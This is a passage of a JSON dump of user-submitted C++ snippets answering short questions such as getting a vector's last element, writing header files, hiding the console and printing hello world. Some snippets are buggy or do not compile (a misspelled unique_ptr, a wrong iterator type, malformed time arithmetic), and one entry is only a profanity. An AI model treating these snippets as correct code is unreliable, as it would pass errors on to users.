    "description": "#include <string> #include <iostream> #include <filesystem> namespace fs = std::filesystem;  int main() {     std::string path = \"/path/to/directory\";     for (const auto & entry : fs::directory_iterator(path))         std::cout << entry.path() << std::endl; }\n#include <dirent.h>  std::vector<std::string> GetRecords() {     std::vector<std::string> files;     struct dirent *entry; \tDIR *dir = opendir(record_dir_path.c_str());  \tif (dir == NULL)  \t{ \t  return files; \t} \twhile ((entry = readdir(dir)) != NULL)  \t{ \t\tfiles.push_back(entry->d_name); \t} \tclosedir(dir); \t \treturn files; }\n",
    "reg_date": "2021-10-12T11:38:04.000Z"
  },
  {
    "id": 930,
    "keyword": null,
    "link": null,
    "title": " c++ get input without loop",
    "description": "#include <iostream>  int receive(void) {   \tint input; \tif (!(std::cin >> input))     {       // TODO: If input is unvalid       // Clear error flag       std::cin.clear();       // Remove incorrect data from buffer       std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');     }  \treturn input;  }\n",
    "reg_date": "2021-10-12T11:38:04.000Z"
  },
  {
    "id": 931,
    "keyword": null,
    "link": null,
    "title": " c++ get last character of string",
    "description": "// Example YourStr.substr(YourStr.length() - 1)  // Syntax std::string YourStr = \"abcdef\"; std::cout << YourStr.substr(YourStr.length() - 1) << \"\\n\"; // OUTPUT: f\nauto find_char = 'a' size_t last_occurence_index = str.find_last_of(find_char);\nString[strlen(String) - 1]; \n",
    "reg_date": "2021-10-12T11:38:04.000Z"
  },
  {
    "id": 932,
    "keyword": null,
    "link": null,
    "title": " c++ get last element in array",
    "description": "#include<iostream> /*To get the last element of the array we first get the size      of the array by using sizeof().  Unfortunately, this gives      us the size of the array in bytes.  To fix this, we divide     the size (in bytes) by the size of the data type in the array.     In our case, this would be int, so we divide sizeof(array)      by sizeof(int).  Since arrays  start from 0 and not 1 we      subtract one to get the last element.     -yegor*/ int array[5] = { 1, 2, 3, 4, 5 }; printf(\"Last Element of Array: %d\", array[(sizeof(array)/sizeof(int))-1]);\n#include <array> std::array<int, 5> a {1, 2, 3, 4, 5}; int i = a[a.size() - 1]; // The last variable stored in i\n",
    "reg_date": "2021-10-12T11:38:04.000Z"
  },
  {
    "id": 933,
    "keyword": null,
    "link": null,
    "title": " c++ get last element in vector",
    "description": "vector<int> vec; vec.push_back(0); vec.push_back(1); int last_element = vec.back(); int also_last_element = vec[vec.size() - 1]; \n#include <iostream> #include <vector>  int main() {   std::vector<int> myvector;      //add 2 to the back   myvector.push_back(2);      std::cout << myvector.back() << std::endl; //this will print 2      myvector.push_back(46);   std::cout << myvector.back() << std::endl; //prints 46      return 0;    }  /*Output 2 46 */\nstd::v.back()\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 934,
    "keyword": null,
    "link": null,
    "title": " c++ get length of array",
    "description": "int arr[5]; int len = sizeof(arr) / sizeof(arr[0]); // returns 5\nint size = sizeof(arr)/sizeof(arr[0])\n// array::size #include <iostream> #include <array>  int main () {   std::array<int,5> myints;   std::cout << \"size of myints: \" << myints.size() << std::endl;   std::cout << \"sizeof(myints): \" << sizeof(myints) << std::endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 935,
    "keyword": null,
    "link": null,
    "title": " c++ get map keys",
    "description": "template<typename TK, typename TV> std::vector<TK> extract_keys(std::map<TK, TV> const& input_map) {   std::vector<TK> retval;   for (auto const& element : input_map) {     retval.push_back(element.first);   }   return retval; }\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 936,
    "keyword": null,
    "link": null,
    "title": " c++ get maximum value unsigned int",
    "description": "// C #include <limits.h> unsigned int max_unsigned_int_size = UINT_MAX;  // C++ #include <limits> unsigned int max_unsigned_int_size = std::numeric_limits<unsigned int>::max();\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 937,
    "keyword": null,
    "link": null,
    "title": " c++ get nth character in string",
    "description": "#include <string> #include <iostream>  int main(){   //index string by using brackets []   std::string string = \"Hello, World!\";   //assign variable to string index   char stringindex = string[2];    }\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 938,
    "keyword": null,
    "link": null,
    "title": " c++ get pointer from unique ptr",
    "description": "#include <memory>  std::unique_ptr<int> myUniquePtr = std::unique_optr<int>(new int(5)); int* rawPtr = myUniquePtr.get();\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 939,
    "keyword": null,
    "link": null,
    "title": " c++ get string between two characters",
    "description": "string str = \"STARTDELIMITER_0_192.168.1.18_STOPDELIMITER\"; unsigned first = str.find(STARTDELIMITER); unsigned last = str.find_last_of(STOPDELIMITER); string strNew = str.substr (first,last-first); std::cout << strNew << std::endl;\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 940,
    "keyword": null,
    "link": null,
    "title": " c++ get system date",
    "description": "#include <string> #include <sstream> #include <iostream>  time_t t = time(0);   // get time now struct tm * now = localtime( & t );  ostringstream osTime; osTime << (now->tm_year + 1900) <<    (now->tm_mon + 1) <<    now->tm_mday <<    \"\\n\";  cout << osTime.str();\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 941,
    "keyword": null,
    "link": null,
    "title": " c++ get type name of object",
    "description": "#include <iostream>  int main() { \tint myNum;   \tstd::cout << typeid(myNum).name();   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:38:05.000Z"
  },
  {
    "id": 942,
    "keyword": null,
    "link": null,
    "title": " c++ get vector element by index",
    "description": "vectorName[5]; // Simple\n// vector::operator[] #include <iostream> #include <vector>  int main () {   std::vector<int> myvector (10);   // 10 zero-initialized elements    std::vector<int>::size_type sz = myvector.size();    // assign some values:   for (unsigned i=0; i<sz; i++) myvector[i]=i;    // reverse vector using operator[]:   for (unsigned i=0; i<sz/2; i++)   {     int temp;     temp = myvector[sz-1-i];     myvector[sz-1-i]=myvector[i];     myvector[i]=temp;   }    std::cout << \"myvector contains:\";   for (unsigned i=0; i<sz; i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    return 0; }\nstd::vector<int> vecOfNums{ 1, 4, 5, 22, 33, 2, 11, 89, 49 }; // Access element at index 3 int & element = vecOfNums[3];\n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 943,
    "keyword": null,
    "link": null,
    "title": " c++ give options",
    "description": "#include <iostream> #include <iomanip> using namespace std;  int IntegerOptionsBox(int NumberOfOptions, ...) {    //set the border options    char sczCorners = '+';    char sczVerticalFillers = '|';    char sczHorizontalFillers = '-';    char sczGeneralFillers = ' ';     // set the spacing options    int iLineWidth = 40;    int iOptionSpace = 15;    int iNumberSpace = 3;    int iTabSpace = 3;     int iRightSpace = iLineWidth - iOptionSpace - iNumberSpace - iTabSpace - 1;     int counter = 0;     do    {       counter++;        va_list arguments; // A place to store the list of arguments        va_start(arguments, NumberOfOptions); // Initializing arguments to store all values after NumberOfOptions        //Top line of the output       cout << sczCorners << setw(iLineWidth) << setfill(sczHorizontalFillers) << \"\"            << sczCorners << \"\\n\";        //Main Lines of the output       for (int i = 1; i <= NumberOfOptions; i++)       {          cout << sczVerticalFillers;          cout << setw(iNumberSpace) << setfill(sczGeneralFillers) << right << i << \".\";          cout << setw(iTabSpace) << setfill(sczGeneralFillers) << left << \"\";          cout << setw(iOptionSpace) << setfill(sczGeneralFillers) << left << va_arg(arguments, char *);          cout << setw(iRightSpace) << setfill(sczGeneralFillers) << left << \"\" << sczVerticalFillers << \"\\n\";       }        //Bottom line of the output       cout << sczCorners << setw(iLineWidth) << setfill(sczHorizontalFillers) << \"\" << sczCorners << \"\\n\";        va_end(arguments); // Cleans up the list        // User's selection process       int iSelected;       cout << \"\\nSelect one of the above options: \";       cin >> iSelected;       bool bInputValidated = cin.good(); // Tells if the input is a valid integer or not       cin.clear();       cin.ignore(99999, '\\n');       cout << \"bInputValidated: \" << bInputValidated << endl;       int iOptionSelected;        /////////////////////////////       //      VALIDATION         //       /////////////////////////////        if ((bInputValidated == 1)) // if the input is a valid integer       {          if ((iSelected <= NumberOfOptions) && (0 < iSelected)) // if the integer is within the range of options          {             return iSelected;          }          else          {             cout << \"The option you selected - \" << iSelected << \" - is not within the range of options. The options range from 1 to \" << NumberOfOptions << \". Please try again.\\n\\n\";          }       }       else // the input is not a valid integer       {          cout << \"The option you selected is not an integer (int) data type. Please try again.\" << counter << endl               << endl;       }     } while (1); }     int main() {   int iOptionSelected = IntegerOptionsBox(2, \"Option1\", \"Option2\");     switch (iOptionSelected)    {       case 1:          cout << \"You selected option 1\\n\";          break;           case 2:          cout << \"You selected option 2\\n\";          break;        default:          cout << \"This option shouldn't be possible\\n\";          break;    }  }\n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 944,
    "keyword": null,
    "link": null,
    "title": " c++ give options string",
    "description": "string StringOptionsBox(int count, ...) {    bool bValidSelection = 1;     do    {        //set the border options       char sczCorners = '+';       char sczVerticalFillers = '|';       char sczHorizontalFillers = '-';       char sczGeneralFillers = ' ';        // set the spacing options       int iLineWidth = 50;       int iOptionSpace = 25;       int iNumberSpace = 3;       int iTabSpace = 3;        int iRightSpace = iLineWidth - iOptionSpace - iNumberSpace - iTabSpace - 1;        va_list arguments; // A place to store the list of arguments        va_start(arguments, count); // Initializing arguments to store all values after count        //////////////////////////////////////////////////////////////////////////////////////       //            LAYOUT THE INTERFACE AND PROMPT THE USER'S SELECTION                  //       //////////////////////////////////////////////////////////////////////////////////////        //Top line of the output       cout << sczCorners << setw(iLineWidth) << setfill(sczHorizontalFillers) << \"\"            << sczCorners << \"\\n\";        //Main Lines of the output       for (int i = 1; i <= count; i++)       {          cout << sczVerticalFillers;          cout << setw(iNumberSpace) << setfill(sczGeneralFillers) << right << i << \".\";          cout << setw(iTabSpace) << setfill(sczGeneralFillers) << left << \"\";          cout << setw(iOptionSpace) << setfill(sczGeneralFillers) << left << va_arg(arguments, char *);          cout << setw(iRightSpace) << setfill(sczGeneralFillers) << left << \"\" << sczVerticalFillers << \"\\n\";       }        //Bottom line of the output       cout << sczCorners << setw(iLineWidth) << setfill(sczHorizontalFillers) << \"\" << sczCorners << \"\\n\";        va_end(arguments); // Cleans up the list        // User's selection process       string sSelected;       cout << \"\\nSelect one of the above options: \"; \tstd::getline(cin, sSelected);       //////////////////////////////////////////////////////////////////////////////////////       //                   RETRIEVE THE STRING THAT WAS SELECTED                          //       //////////////////////////////////////////////////////////////////////////////////////        va_list arguments2; // A place to store the list of arguments        va_start(arguments2, count); // Initializing arguments to store all values after count        //Main Lines of the output       for (int i = 1; i <= count; i++)       {          if (i == atoi(sSelected.c_str()))          {             return va_arg(arguments2, char *); // returns the string that was selected          }           else if (i != count)          {             va_arg(arguments2, char *);          }          else          {             va_arg(arguments2, char *);          }       }       va_end(arguments2);        //////////////////////////////////////////////////////////////////////////////////////       //              MAKE PROVISIONS FOR IF THE SELECTION IS INCORRECT                   //       //////////////////////////////////////////////////////////////////////////////////////        cout << \"\\nERROR \\nThe option that you have selected - \" << sSelected << \" - does not exist. Please try again. \\n\\n\";       bValidSelection = 0;     } while (bValidSelection != 1); } \n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 945,
    "keyword": null,
    "link": null,
    "title": " c++ global variable",
    "description": "// a.cpp int x = 5;  // b.cpp extern int x; // allows b.cpp to access 'x' from a.cpp\n#include <iostream>  int global = 3; // Une variable globale  void ChangeGlobal() {    global = 5; // R&eacute;f&eacute;rence &agrave; la variable globale &agrave; l'int&eacute;rieur d'une fonction }  int main() {    std::cout << global << '\\n'; // R&eacute;f&eacute;rence &agrave; la variable globale dans une autre fonction    ChangeGlobal();    std::cout << global << '\\n';    return 0; } \nint g_x; // global variable g_x\n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 946,
    "keyword": null,
    "link": null,
    "title": " c++ guess my number",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tint num, guess, tries = 0; \tsrand(time(0)); //seed random number generator \tnum = rand() % 100 + 1; // random number between 1 and 100 \tcout << \"Guess My Number Game\\n\\n\";  \tdo \t{ \t\tcout << \"Enter a guess between 1 and 100 : \"; \t\tcin >> guess; \t\ttries++;  \t\tif (guess > num) \t\t\tcout << \"Too high!\\n\\n\"; \t\telse if (guess < num) \t\t\tcout << \"Too low!\\n\\n\"; \t\telse \t\t\tcout << \"\\nCorrect! You got it in \" << tries << \" guesses!\\n\"; \t} while (guess != num);  \treturn 0; }   \n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 947,
    "keyword": null,
    "link": null,
    "title": " c++ handling",
    "description": "#include fuck\n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 948,
    "keyword": null,
    "link": null,
    "title": " c++ header boilerplate",
    "description": "#ifndef LIST_H // LIST_H is a random name, you can use anything  #define LIST_H  // enter your code here   #endif // LIST_H\n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 949,
    "keyword": null,
    "link": null,
    "title": " c++ header files",
    "description": "// my_class.h #ifndef MY_CLASS_H // include guard #define MY_CLASS_H  namespace N {     class my_class     {     public:         void do_something();     }; }  #endif /* MY_CLASS_H */ \n#include \"headerfile.h\"\n//headers  #ifndef TOOLS_hpp  #define TOOLS_hpp #include<vector>  #include<iostream> #include<fstream> #include<string> using std::ifstream; using std::cout;  using std::cin; using std::endl; using std::cerr; using std::vector; using std::string; // functions prototypes  inline vector<int> merge(const vector<int>&a,const vector<int>& b);//merge function prototype with Formal Parameters  std::vector<int> sort(size_t start, size_t length, const std::vector<int>& vec);//sort function prototype with formal parameters  #endif \n// You should use header files when you wan't to split your // program across multiple files. Use it like this:  // vec2.hpp class vec2 { \tpublic:   \t\tvoid printVec(); // Decleration   \t\tfloat x, y; } // vec2.cpp #include \"vec2.hpp\" void vec2::printVec() { // Implementation \tstd::cout << x << y << std::endl; }\n// sample.h #pragma once #include <vector> // #include directive #include <string>  namespace N  // namespace declaration {     inline namespace P     {         //...     }      enum class colors : short { red, blue, purple, azure };      const double PI = 3.14;  // const and constexpr definitions     constexpr int MeaningOfLife{ 42 };     constexpr int get_meaning()     {         static_assert(MeaningOfLife == 42, \"unexpected!\"); // static_assert         return MeaningOfLife;     }     using vstr = std::vector<int>;  // type alias     extern double d; // extern variable  #define LOG   // macro definition  #ifdef LOG   // conditional compilation directive     void print_to_log(); #endif      class my_class   // regular class definition,     {                // but no non-inline function definitions          friend class other_class;     public:         void do_something();   // definition in my_class.cpp         inline void put_value(int i) { vals.push_back(i); } // inline OK      private:         vstr vals;         int i;     };      struct RGB     {         short r{ 0 };  // member initialization         short g{ 0 };         short b{ 0 };     };      template <typename T>  // template definition     class value_store     {     public:         value_store<T>() = default;         void write_value(T val)         {             //... function definition OK in template         }     private:         std::vector<T> vals;     };      template <typename T>  // template declaration     class value_widget; } \n// my_class.cpp #include \"my_class.h\" // header in local directory #include <iostream> // header in standard library  using namespace N; using namespace std;  void my_class::do_something() {     cout << \"Doing something!\" << endl; } \n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 950,
    "keyword": null,
    "link": null,
    "title": " c++ header files example",
    "description": "// my_class.h #ifndef MY_CLASS_H // include guard #define MY_CLASS_H  namespace N {     class my_class     {     public:         void do_something();     }; }  #endif /* MY_CLASS_H */ \n#include \"headerfile.h\"\n//headers  #ifndef TOOLS_hpp  #define TOOLS_hpp #include<vector>  #include<iostream> #include<fstream> #include<string> using std::ifstream; using std::cout;  using std::cin; using std::endl; using std::cerr; using std::vector; using std::string; // functions prototypes  inline vector<int> merge(const vector<int>&a,const vector<int>& b);//merge function prototype with Formal Parameters  std::vector<int> sort(size_t start, size_t length, const std::vector<int>& vec);//sort function prototype with formal parameters  #endif \n// sample.h #pragma once #include <vector> // #include directive #include <string>  namespace N  // namespace declaration {     inline namespace P     {         //...     }      enum class colors : short { red, blue, purple, azure };      const double PI = 3.14;  // const and constexpr definitions     constexpr int MeaningOfLife{ 42 };     constexpr int get_meaning()     {         static_assert(MeaningOfLife == 42, \"unexpected!\"); // static_assert         return MeaningOfLife;     }     using vstr = std::vector<int>;  // type alias     extern double d; // extern variable  #define LOG   // macro definition  #ifdef LOG   // conditional compilation directive     void print_to_log(); #endif      class my_class   // regular class definition,     {                // but no non-inline function definitions          friend class other_class;     public:         void do_something();   // definition in my_class.cpp         inline void put_value(int i) { vals.push_back(i); } // inline OK      private:         vstr vals;         int i;     };      struct RGB     {         short r{ 0 };  // member initialization         short g{ 0 };         short b{ 0 };     };      template <typename T>  // template definition     class value_store     {     public:         value_store<T>() = default;         void write_value(T val)         {             //... function definition OK in template         }     private:         std::vector<T> vals;     };      template <typename T>  // template declaration     class value_widget; } \n#include \"enter_name_here.cpp\"  //Make sure the files are in the same directory. \n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 951,
    "keyword": null,
    "link": null,
    "title": " c++ hello word",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n#include<iostreme> using namespace std; int main(){   cout<<\"Hello World!\";   return 0; }\n",
    "reg_date": "2021-10-12T11:38:06.000Z"
  },
  {
    "id": 952,
    "keyword": null,
    "link": null,
    "title": " c++ hello world",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include <iostream>  int main(int argc, char* argv[]) {     std::cout << \"Hello World!\" << std::endl;          return 0; }\n#include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } //If you are a web developer, please give https://code.ionicbyte.com/ a try\n#include<iostream>  using namespace std;  int main() {     cout<<\"Hello World\";           return 0; }\n #include<iostream>   using namespace std;  int main() {     cout<<\"Hello World\";           return 0; }\n#include <iostream>  int main() {   std::cout << \"Hello, C++!\" << std::endl;   return 0; }\n#include <iostream> using namespace std;  int main(){      cout<<\"Hello, World!\";      return 0; }\n#include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include <iostream>  int main() {     std::cout << \"Hello World!\" << std::endl;     return 0; }\n #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 953,
    "keyword": null,
    "link": null,
    "title": " c++ hello world linux",
    "description": "g++ main.cpp -o app \n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 954,
    "keyword": null,
    "link": null,
    "title": " c++ hello world program",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include<iostream> using std::cout;  int main(){     cout << \"Hello World\";     return 0; }\n#include <bits/stdc++.h>  using namespace std;  int main(){ \tcout << \"hello world! \\n\";  }                                                     //code by goukl aakash\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 955,
    "keyword": null,
    "link": null,
    "title": " c++ hello world vs",
    "description": "g++ --version\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 956,
    "keyword": null,
    "link": null,
    "title": " c++ hide  credentials",
    "description": "#include \"obfuscate.h\"  int main() {   std::cout << AY_OBFUSCATE(\"Hello World\") << std::endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 957,
    "keyword": null,
    "link": null,
    "title": " c++ hide console",
    "description": "#include <WinUser.h>  int main {     ShowWindow(GetConsoleWindow(), SW_HIDE);          return 0; }\n/* Anwser from greper Made by Mega145 query: c++ hide console */ #include <Windows.h> void HideConsole() {     ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }  void ShowConsole() {     ::ShowWindow(::GetConsoleWindow(), SW_SHOW); }  bool IsConsoleVisible() {     return ::IsWindowVisible(::GetConsoleWindow()) != FALSE; }  void ToggleConsole() { \tif (!IsConsoleVisible())     {       ShowConsole();     }     else if (IsConsoleVisible())     {       HideConsole();     } }\n#include <WinUser.h>  ShowWindow(GetConsoleWindow(), SW_HIDE);\n#include <windows.h>  int main {     ShowWindow(GetConsoleWindow(), SW_HIDE);     //ShowWindow(GetConsoleWindow(), SW_SHOW);     return 0; }\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 958,
    "keyword": null,
    "link": null,
    "title": " c++ hide cursor",
    "description": "void set_cursor(bool visible){     CONSOLE_CURSOR_INFO info;     info.dwSize = 100;     info.bVisible = visible;     SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &info); }\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 959,
    "keyword": null,
    "link": null,
    "title": " c++ hide show console",
    "description": "#include <WinUser.h>  int main {     ShowWindow(GetConsoleWindow(), SW_HIDE);          return 0; }\n#include <WinUser.h>  ShowWindow(GetConsoleWindow(), SW_HIDE);\n#include <windows.h>  int main {     ShowWindow(GetConsoleWindow(), SW_HIDE);     //ShowWindow(GetConsoleWindow(), SW_SHOW);     return 0; }\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 960,
    "keyword": null,
    "link": null,
    "title": " c++ hours minutes seconds",
    "description": "int seconds, hours, minutes; cin >> seconds; minutes = seconds / 60; hours = minutes / 60; cout << seconds << \" seconds is equivalent to \" << int(hours) << \" hours \" << int(minutes`)       << \" minutes \" << int(seconds`) << \" seconds.\";\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 961,
    "keyword": null,
    "link": null,
    "title": " c++ how to add something at the start of a vector",
    "description": "#include <vector>  int main() {     std::vector<int> v{ 1, 2, 3, 4, 5 };     v.insert(v.begin(), 6); }\n",
    "reg_date": "2021-10-12T11:38:07.000Z"
  },
  {
    "id": 962,
    "keyword": null,
    "link": null,
    "title": " c++ how to check if ifle is opened",
    "description": "ifstream file; file.open(argv[1]); if (!file.is_open()) {    cerr << \"File did not open\";   exit(1);  }\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 963,
    "keyword": null,
    "link": null,
    "title": " c++ how to do else if statements",
    "description": "if (variable) {   variable is true    }\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 964,
    "keyword": null,
    "link": null,
    "title": " c++ how to falling numbers",
    "description": "#include <iostream> #include <windows.h>   #include <stdio.h> #include <stdlib.h> #include <time.h> #include <conio.h> using namespace std;   #define KB_UP 72 #define KB_DOWN 80 #define KB_LEFT 75 #define KB_RIGHT 77 #define KB_ESCAPE 27 #define KB_F8 66   /* Variables*/  char screen_buffer[2000]={' '}; int y_coord[2000]={0}; int x=0, y=0,dy=0; int XMAX=77; int YMAX=23; int KB_code=0; bool QuitGame=false; int platformX=35, platformY=23;  /* function prototypes*/  void gotoxy(int x, int y); void clrscr(void); void setcolor(WORD color);  void simple_keyboard_input();   void draw_falling_numbers(); void draw_platform();  /*  main  */  int main(void) {   /* generate random seed */   srand ( time(NULL) );    /* generate random number*/   for(int i=0;i<XMAX;i++) y_coord[i]=   rand() % YMAX;    while(!QuitGame)   {       /* simple keyboard input */       simple_keyboard_input();        /* draw falling numbers */       draw_falling_numbers();    }    /* restore text color */   setcolor(7);   clrscr( );   cout<<\" \\n\";    cout<<\" \\nPress any key to continue\\n\";   cin.ignore();   cin.get();     return 0; }  /* functions  */  void draw_falling_numbers() {      for(x=0;x<=XMAX;x++)     {         /* generate random number */         int MatixNumber=rand() % 2 ;          /* update falling number */         y_coord[x]=y_coord[x]+1;          if (y_coord[x]>YMAX) y_coord[x]=0;          /* draw dark color */         setcolor(2);         gotoxy(x ,y_coord[x]-1); cout<<\"  \"<<MatixNumber<<\"   \";          /* draw light color */         setcolor(10);         gotoxy(x ,y_coord[x]); cout<<\"  \"<<MatixNumber<<\"   \";     }     /* wait some milliseconds */     Sleep(50);     //clrscr( ); }   void draw_platform() {   setcolor(7);  gotoxy(platformX ,platformY);cout<<\"       \";   gotoxy(platformX ,platformY);cout<<\"&Uuml;&Uuml;&Uuml;&Uuml;&Uuml;&Uuml;\";  setcolor(7);  Sleep(5); }     void simple_keyboard_input() {     if (kbhit())       {             KB_code = getch();             //cout<<\"KB_code = \"<<KB_code<<\"\\n\";              switch (KB_code)             {                  case KB_ESCAPE:                      QuitGame=true;                  break;                  case KB_LEFT:                            //Do something                     platformX=platformX-4;if(platformX<3) platformX=3;                 break;                  case KB_RIGHT:                            //Do something                          platformX=platformX+4;if(platformX>74) platformX=74;                 break;                  case KB_UP:                            //Do something                                      break;                  case KB_DOWN:                            //Do something                                      break;              }                }  }   void setcolor(WORD color) {     SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),color);     return; }   void gotoxy(int x, int y) {   static HANDLE hStdout = NULL;   COORD coord;    coord.X = x;   coord.Y = y;    if(!hStdout)   {     hStdout = GetStdHandle(STD_OUTPUT_HANDLE);   }    SetConsoleCursorPosition(hStdout,coord); }   void clrscr(void) {   static HANDLE hStdout = NULL;         static CONSOLE_SCREEN_BUFFER_INFO csbi;   const COORD startCoords = {0,0};      DWORD dummy;    if(!hStdout)                  {     hStdout = GetStdHandle(STD_OUTPUT_HANDLE);     GetConsoleScreenBufferInfo(hStdout,&csbi);   }    FillConsoleOutputCharacter(hStdout,                              ' ',                              csbi.dwSize.X * csbi.dwSize.Y,                              startCoords,                              &dummy);       gotoxy(0,0); }\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 965,
    "keyword": null,
    "link": null,
    "title": " c++ how to generate a random number in a range",
    "description": "min + ( std::rand() % ( max - min + 1 ) )\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 966,
    "keyword": null,
    "link": null,
    "title": " c++ how to get maximum value",
    "description": "#include <limits>  int imin = std::numeric_limits<int>::min(); // minimum value int imax = std::numeric_limits<int>::max(); // maximum value (2147483647)\n// C #include <limits.h> unsigned int max_unsigned_int_size = UINT_MAX;  // C++ #include <limits> unsigned int max_unsigned_int_size = std::numeric_limits<unsigned int>::max();\nx = 1, y  = 2; fmax(x , y); //if you want to print it right away: cout << fmax(x , y); //if you want to store it: int j = fmax(x, y); cout << j;  //output 2\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 967,
    "keyword": null,
    "link": null,
    "title": " c++ how to import only one function",
    "description": "it is not possible in C or C++ If it's your own library you can split the library into smaller and import the one you want. If the library is not yours and/or you cannot change it you have to import it all\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 968,
    "keyword": null,
    "link": null,
    "title": " c++ how to inherit from a template class",
    "description": "// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\ntemplate inheritance\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 969,
    "keyword": null,
    "link": null,
    "title": " c++ how to loop through a vector but not the last element",
    "description": "std::vector<int> vec{1,2,3}; for (int* it{vec.begin()} ; it != std::prev(vec.end()) ; it++)   #Do something\n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 970,
    "keyword": null,
    "link": null,
    "title": " c++ how to make a negative float positive",
    "description": "float f{-0.27452}; std::cout << fabs(f) << std::endl; // 0.27452 \n",
    "reg_date": "2021-10-12T11:38:08.000Z"
  },
  {
    "id": 971,
    "keyword": null,
    "link": null,
    "title": " c++ how to return an empty vector",
    "description": "return vector<int>(); //or return{};\n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 972,
    "keyword": null,
    "link": null,
    "title": " c++ how to sort numbers in ascending order",
    "description": "\t// With the first loop we take a number of the array(x).      // With the second we take all the numbers in the array except x. \t// So we can compare each number with all the other numbers(9)  int arr[] = { 9, 8 , 3 , 5, 1, 2 , 0 , 4, 10,6 }; // System Input. \tfor (int i = 0; i < 10; i++)     // For loop running array lenght times(10). \t{ \t\tfor (int j = i + 1; j < 10; j++) // For loop running 9 times(other nums).\t \t\t{ \t\t\tif (arr[i] > arr[j]) // Checking if current num(x) is larger than the next num(j). \t\t\t{ \t\t\t\t \t\t\t\tint temp = arr[i]; // Storing current num(x) \t\t\t\tarr[i] = arr[j]; // Making i number equal to the next num(j). \t\t\t\tarr[j] = temp;  // Making the next number qeual to temp(i). \t\t\t}\t \t\t}      \t// SWITCHING PLACES WITH THE CURRENT AND THE NEXT NUM. \t}  \tfor (int i = 0; i < 10; i++)  // For loop running array lenght times(10). \t{ \t\tcout << arr[i] << endl; // printing all the numbers!  \t}\n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 973,
    "keyword": null,
    "link": null,
    "title": " c++ how to use scanf",
    "description": "#include <stdio.h>  int main() {     int a, b, c;     printf(\"Enter the first value:\");     scanf(\"%d\", &a);     printf(\"Enter the second value:\");     scanf(\"%d\", &b);     c = a + b;     printf(\"%d + %d = %d\\n\", a, b, c);     return 0; } \n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 974,
    "keyword": null,
    "link": null,
    "title": " c++ hsl to rgb integer",
